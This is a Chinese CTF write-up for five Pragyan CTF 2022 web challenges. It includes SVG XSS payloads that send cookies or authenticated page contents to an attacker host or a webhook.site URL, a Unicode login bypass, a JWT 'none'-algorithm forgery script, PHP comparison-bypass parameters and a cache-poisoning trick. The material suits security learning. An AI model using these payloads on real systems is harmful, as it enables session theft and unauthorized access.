---
title: Pragyan CTF 2022
categories: 赛题wp
---



![image-20220323204158108](https://img-blog.csdnimg.cn/img_convert/dfc04e6e850b373d39a20c1372c6325f.png)



<!--more-->

# Excess Cookie V1

- svg xss

题目要求admin登录，个人中心可以上传头像，有搜索功能，可以根据用户的UUID进行查询，然后展示个人的页面，包括头像，UUID不可爆破，报告页面回显报告admin，所以思路就是xss打admin



![image-20220306223525870](https://img-blog.csdnimg.cn/img_convert/c25bd05ba194c49d6c378422f839c806.png)

测试发现可以上传svg，造成xss，直接打cookie

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    window.open('http://vps/'+document.cookie);
    //fetch('http://<your-public-IP>?c='+document.cookie);
  </script>
</svg>
```



![image-20220306223442579](https://img-blog.csdnimg.cn/img_convert/14b3784e07963750cf40f1ace5886ddc.png)

替换cookie，admin登录

FLAG：p_ctf{x33_a4d_svg_m4k3s_b3st_p41r}

# Excess Cookie V2

- http-only

题目说是修复非预期，明明这题才是非预期

直接拿上面那题的admin的UUID直接去搜索，回显flag

![image-20220306224948051](https://img-blog.csdnimg.cn/img_convert/a22c4fc1cfd9d53fb558b022e0ed5004.png)

预期就是绕HTTP-only，vps接受发过来的信息就行了

payload

```
<?xml version="1.0" encoding="UTF-8"?> 
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve"> 
  <g>
    <polygon fill="#00B0D9" points="41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 "></polygon>
    <script type="text/javascript">
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          var xhr2 = new XMLHttpRequest();
          xhr2.open("POST", "your-public-ip", true);
          xhr2.send(xhr.responseText);
        }
      }   
      xhr.open("GET", "https://challenge-domain/home");
      xhr.withCredentials = true;
      xhr.send();
    </script>
  </g>
</svg>
```

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
(async function(){navigator.sendBeacon("https://webhook.site/c0e04b51-df34-409c-8fe3-6eacd23f5ccc",await fetch("https://excesscookiev2.challs.pragyanctf.tech/home").then(r=>r.text()).then(d=>d))})()
   </script>
</svg>
```

FLAG：p_ctf{x33_a4d_svg_m4k3s_b3st_p41r_on1y_w1th_http_0nly}

# Code of Chaos

robots.txt发现代码

```js
require 'sinatra/base'
require 'sinatra'
require "sinatra/cookies"

get '/' do
if request.cookies['auth']
@user = getUsername() # getUsername() - Method to get username from cookies
if @user.upcase == "MICHAEL"
return erb :michael
end
return erb:index
else
return erb :index
end
end

post '/login' do
user = params['username'].to_s[0..20]
password = params['password'].to_s[0..20]
if user =~ /[A-Z]/ or user == 'michael'
info = "Invalid Username/Password"
return erb :login, :locals => {:info => info}
elsif password == "whatever" and user.upcase == "MICHAEL"
set_Cookies(user)
else
info = "Invalid Username/Password"
return erb :login, :locals => {:info => info}
end
redirect '/'
end
```

ruby语言，代码逻辑就是用户名不能是 michael 但是检查的时候，转为大写后需要等于 MICHAEL 可以利用js的特性绕过

```
toUpperCase(): 字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"
```

paylaod

```
username=mıchael&password=whatever
```

得到半段flag

![](https://img-blog.csdnimg.cn/img_convert/22698f18a734a6d6ac23f4051dbbd964.png)

看下cookie为jwt

![image-20220306192932011](https://img-blog.csdnimg.cn/img_convert/58ffbb491bb36fb60c9cff167374a533.png)

尝试伪造

```python
import jwt

print(jwt.encode({"user":"admin"}, key="", algorithm="none"))
```

FLAG：p_ctf{un1c0de_4nd_j3t_m4kes_fu7}

# PHP train

```php
<?php
    show_source("index.php");
    include 'constants.php';
    error_reporting(0);
    if(isset($_GET["param1"])) {
        if(!strcmp($_GET["param1"], CONSTANT1)) {
            echo FLAG1;
        }
    }

    if(isset($_GET["param2"]) && isset($_GET["param3"])) {
        $str2 = $_GET["param2"];
        $str3 = $_GET["param3"];
        if(($str2 !== $str3) && (sha1($str2) === sha1($str3))) {
            echo FLAG2;
        }
    }

    if(isset($_GET["param4"])) {
        $str4 = $_GET["param4"];
        $str4=trim($str4);
        if($str4 == '1.2e3' && $str4 !== '1.2e3') {
            echo FLAG3;
        }
    }

    if(isset($_GET["param5"])) {
        $str5 = $_GET["param5"];
        if($str5 == 89 && $str5 !== '89' && $str5 !== 89 && strlen(trim($str5)) == 2) {
            echo FLAG4;
        }
    }

    if(isset($_GET["param6"])) {
        $str6 = $_GET["param6"];
        if(hash('md4', $str6) == 0) {
            echo FLAG5;
        }
    }

    if(isset($_GET["param7"])) {
        $str7 = $_GET["param7"];
        $var1 = 'helloworld';
        $var2 = preg_replace("/$var1/", '', $str7);
        if($var1 === $var2) {
            echo FLAG6;
        }
    }

    if(isset($_GET["param8"])) {
        $str8 = $_GET["param8"];
        $comp = range(1, 25);
        if(in_array($str8, $comp)) {
            if(preg_match("/\.env/", $str8)) {
                echo FLAG7;
            }
        }
    }
?>
```

简单php绕过

paylaod

```
?param1[]=1&param2[]=a&param3[]=b&param4=1200&param5=89%20&param6=20583002034&param7=hellohelloworldworld&param8=5.env
```

FLAG：p_ctf{ech0_1f_7h3_7r41n_d035_n07_5t0p_1n_y0ur_5t4t10n_7h3n_1t5_n07_y0ur_7r41n}



# Lost Flag

访问/flag路由回显Only admin can view this!，所以需要admin的身份，在report，尝试提交flag

![image-20220307112837862](https://img-blog.csdnimg.cn/img_convert/5288b0de3f4cec28581feb5902e8a41c.png)

此时再去访问/flag，发现页面变化

![image-20220307112912961](https://img-blog.csdnimg.cn/img_convert/5cabfbff22d20273811176202828295f.png)

再次report flag.txt，访问/flag.txt发现页面又变化了。

 **^(?=.\*?[A-Z])(?=.\*?[a-z])(?=.\*?[0-9])(?=.\*?[?!@$%^\&amp;*-]).{8,}$**

![image-20220307075518988](https://img-blog.csdnimg.cn/img_convert/08633b711d4f1ec5754c8944d45936c4.png)

过了大概10秒，再次访问页面又回到了only admin，所以说当report一个带有 html js等后缀的路径时，admin会去访问，在这期间回显缓存页面，条件就是满足上面的正则。

payload

```
flag@Y0ng123.txt
```

访问/flag@Y0ng123.txt，拿到了flag

FLAG：p_ctf{w3b_c4ch3_p0is1on1ng_1s_m0r3_d4ng3r}

